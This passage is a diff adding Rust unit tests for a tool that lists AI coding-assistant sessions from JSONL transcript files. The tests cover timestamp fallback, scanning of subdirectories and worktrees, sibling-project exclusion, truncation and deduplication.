+            r#"{"sessionId":"abc","timestamp":"2020-01-01T01:02:03.500Z","type":"assistant","message":{"content":[{"type":"text","text":"done"}]}}"#.to_string(),
+        ];
+        let path = write_transcript(tmp.path(), "abc.jsonl", &lines);
+        // mtime is "now" — years after the conversation.
+        let info = parse_session_file(&path).expect("parsed");
+        assert_eq!(info.last_active, "2020-01-01T01:02:03.500Z");
+    }
+
+    #[test]
+    fn last_active_falls_back_to_mtime_without_timestamps() {
+        let tmp = tempfile::tempdir().unwrap();
+        let lines = vec![user_line("abc", "no timestamps here")];
+        let path = write_transcript(tmp.path(), "abc.jsonl", &lines);
+        let info = parse_session_file(&path).expect("parsed");
+        // No message timestamp -> mtime, which is recent, not the epoch.
+        assert!(
+            info.last_active > "2020-01-01T00:00:00.000Z".to_string(),
+            "expected an mtime-derived timestamp, got {}",
+            info.last_active
+        );
+    }
+
+    // ---- collect_sessions (the widened, self-reporting listing) -----------
+
+    /// Lays out `~/.claude/projects`-shaped roots inside a tempdir.
+    fn projects_root() -> tempfile::TempDir {
+        tempfile::tempdir().unwrap()
+    }
+
+    fn dir_for(root: &Path, project: &str) -> PathBuf {
+        root.join(encode_project_path(project))
+    }
+
+    fn transcript_with_cwd(id: &str, cwd: &str, text: &str, ts: &str) -> String {
+        let cwd = cwd.replace('\\', "\\\\");
+        format!(
+            r#"{{"sessionId":"{id}","cwd":"{cwd}","timestamp":"{ts}","type":"user","message":{{"content":"{text}"}}}}"#
+        )
+    }
+
+    #[test]
+    fn listing_finds_the_projects_own_directory() {
+        let root = projects_root();
+        let project = "/repo";
+        write_transcript(
+            &dir_for(root.path(), project),
+            "aaaaaaaa-0000-0000-0000-000000000001.jsonl",
+            &[transcript_with_cwd(
+                "aaaaaaaa-0000-0000-0000-000000000001",
+                "/repo",
+                "in the repo",
+                "2026-01-01T00:00:00.000Z",
+            )],
+        );
+        let listing = collect_sessions(root.path(), project, &[]);
+        assert_eq!(listing.sessions.len(), 1);
+        assert_eq!(listing.total_found, 1);
+        assert!(!listing.truncated);
+        assert_eq!(listing.unreadable, 0);
+    }
+
+    #[test]
+    fn listing_reaches_subdirectories_and_deleted_inside_repo_worktrees() {
+        // The whole point of the prefix scan: `/repo/sub` and a worktree that
+        // used to live at `/repo/wt` both encode to `-repo-...`, and neither is
+        // reachable from the project path alone.
+        let root = projects_root();
+        let project = "/repo";
+        write_transcript(
+            &dir_for(root.path(), "/repo"),
+            "aaaaaaaa-0000-0000-0000-000000000001.jsonl",
+            &[transcript_with_cwd(
+                "aaaaaaaa-0000-0000-0000-000000000001",
+                "/repo",
+                "root convo",
+                "2026-01-01T00:00:00.000Z",
+            )],
+        );
+        write_transcript(
+            &dir_for(root.path(), "/repo/sub"),
+            "bbbbbbbb-0000-0000-0000-000000000002.jsonl",
+            &[transcript_with_cwd(
+                "bbbbbbbb-0000-0000-0000-000000000002",
+                "/repo/sub",
+                "subdir convo",
+                "2026-01-02T00:00:00.000Z",
+            )],
+        );
+        write_transcript(
+            &dir_for(root.path(), "/repo/wt-gone"),
+            "cccccccc-0000-0000-0000-000000000003.jsonl",
+            &[transcript_with_cwd(
+                "cccccccc-0000-0000-0000-000000000003",
+                "/repo/wt-gone",
+                "deleted worktree convo",
+                "2026-01-03T00:00:00.000Z",
+            )],
+        );
+
+        let listing = collect_sessions(root.path(), project, &[]);
+        let prompts: Vec<&str> = listing
+            .sessions
+            .iter()
+            .filter_map(|s| s.first_prompt.as_deref())
+            .collect();
+        assert_eq!(listing.total_found, 3);
+        assert!(prompts.contains(&"subdir convo"), "{prompts:?}");
+        assert!(prompts.contains(&"deleted worktree convo"), "{prompts:?}");
+        // The deleted worktree is still named, flagged as gone, not blanked.
+        let gone = listing
+            .sessions
+            .iter()
+            .find(|s| s.first_prompt.as_deref() == Some("deleted worktree convo"))
+            .unwrap();
+        assert_eq!(gone.cwd.as_deref(), Some("/repo/wt-gone"));
+        assert!(!gone.cwd_exists);
+        // Newest first.
+        assert_eq!(prompts[0], "deleted worktree convo");
+    }
+
+    #[test]
+    fn listing_excludes_a_sibling_project_that_shares_the_encoded_prefix() {
+        // `/repo-old` encodes to `-repo-old`, which starts with `-repo-`.
+        // Directory names cannot tell the two apart; the recorded cwd can.
+        let root = projects_root();
+        write_transcript(
+            &dir_for(root.path(), "/repo-old"),
+            "dddddddd-0000-0000-0000-000000000004.jsonl",
+            &[transcript_with_cwd(
+                "dddddddd-0000-0000-0000-000000000004",
+                "/repo-old",
+                "different project",
+                "2026-01-04T00:00:00.000Z",
+            )],
+        );
+        let listing = collect_sessions(root.path(), "/repo", &[]);
+        assert_eq!(listing.total_found, 0, "{:?}", listing.sessions);
+    }
+
+    #[test]
+    fn listing_scans_caller_supplied_roots_outside_the_repo() {
+        // Maestro keeps worktrees in app-data, so no prefix of the project path
+        // reaches them — the caller has to hand them over.
+        let root = projects_root();
+        let worktree = "/appdata/worktrees/feat-x";
+        write_transcript(
+            &dir_for(root.path(), worktree),
+            "eeeeeeee-0000-0000-0000-000000000005.jsonl",
+            &[transcript_with_cwd(
+                "eeeeeeee-0000-0000-0000-000000000005",
+                worktree,
+                "outside worktree convo",
+                "2026-01-05T00:00:00.000Z",
+            )],
+        );
+
+        let without = collect_sessions(root.path(), "/repo", &[]);
+        assert_eq!(without.total_found, 0);
+
+        let with = collect_sessions(root.path(), "/repo", &[worktree.to_string()]);
+        assert_eq!(with.total_found, 1);
+        assert_eq!(
+            with.sessions[0].first_prompt.as_deref(),
+            Some("outside worktree convo")
+        );
+    }
+
+    #[test]
+    fn listing_counts_unparseable_transcripts_instead_of_dropping_them() {
+        let root = projects_root();
+        let dir = dir_for(root.path(), "/repo");
+        write_transcript(
+            &dir,
+            "ffffffff-0000-0000-0000-000000000006.jsonl",
+            &[transcript_with_cwd(
+                "ffffffff-0000-0000-0000-000000000006",
+                "/repo",
+                "good one",
+                "2026-01-06T00:00:00.000Z",
+            )],
+        );
+        // Not JSON, and a name that yields no safe session id.
+        write_transcript(
+            &dir,
+            "garbage-notes.jsonl",
+            &["not json at all".to_string()],
+        );
+
+        let listing = collect_sessions(root.path(), "/repo", &[]);
+        assert_eq!(listing.sessions.len(), 1);
+        assert_eq!(listing.total_found, 1);
+        assert_eq!(listing.unreadable, 1);
+    }
+
+    #[test]
+    fn listing_reports_truncation_rather_than_hiding_it() {
+        let root = projects_root();
+        let dir = dir_for(root.path(), "/repo");
+        let extra = 3;
+        for i in 0..(MAX_SESSIONS_RETURNED + extra) {
+            let id = format!("aaaaaaaa-0000-0000-0000-{i:012}");
+            write_transcript(
+                &dir,
+                &format!("{id}.jsonl"),
+                &[transcript_with_cwd(
+                    &id,
+                    "/repo",
+                    "convo",
+                    &format!("2026-01-01T00:00:{:02}.000Z", i % 60),
+                )],
+            );
+        }
+        let listing = collect_sessions(root.path(), "/repo", &[]);
+        assert_eq!(listing.sessions.len(), MAX_SESSIONS_RETURNED);
+        assert_eq!(listing.total_found, MAX_SESSIONS_RETURNED + extra);
+        assert!(listing.truncated);
+    }
+
+    #[test]
+    fn listing_dedupes_a_conversation_resumed_in_another_directory() {
+        // The same session id is written to every directory it ran from; the
+        // freshest copy wins so the row is not duplicated.
+        let root = projects_root();
+        let id = "aaaaaaaa-1111-2222-3333-444444444444";
+        write_transcript(
+            &dir_for(root.path(), "/repo"),
+            &format!("{id}.jsonl"),
+            &[transcript_with_cwd(
+                id,
+                "/repo",
+                "older copy",
+                "2026-01-01T00:00:00.000Z",
+            )],
+        );
+        write_transcript(
+            &dir_for(root.path(), "/repo/sub"),
+            &format!("{id}.jsonl"),
+            &[transcript_with_cwd(
+                id,
+                "/repo/sub",
+                "newer copy",
+                "2026-02-01T00:00:00.000Z",
+            )],
+        );
+        let listing = collect_sessions(root.path(), "/repo", &[]);
+        assert_eq!(listing.total_found, 1);
+        assert_eq!(
+            listing.sessions[0].first_prompt.as_deref(),
+            Some("newer copy")
+        );
+    }
+
+    #[test]
+    fn listing_is_empty_when_nothing_matches() {
+        let root = projects_root();
+        let listing = collect_sessions(root.path(), "/repo", &[]);
+        assert!(listing.sessions.is_empty());
+        assert_eq!(listing.total_found, 0);
+        assert!(!listing.truncated);
+        assert_eq!(listing.unreadable, 0);
     }
 }
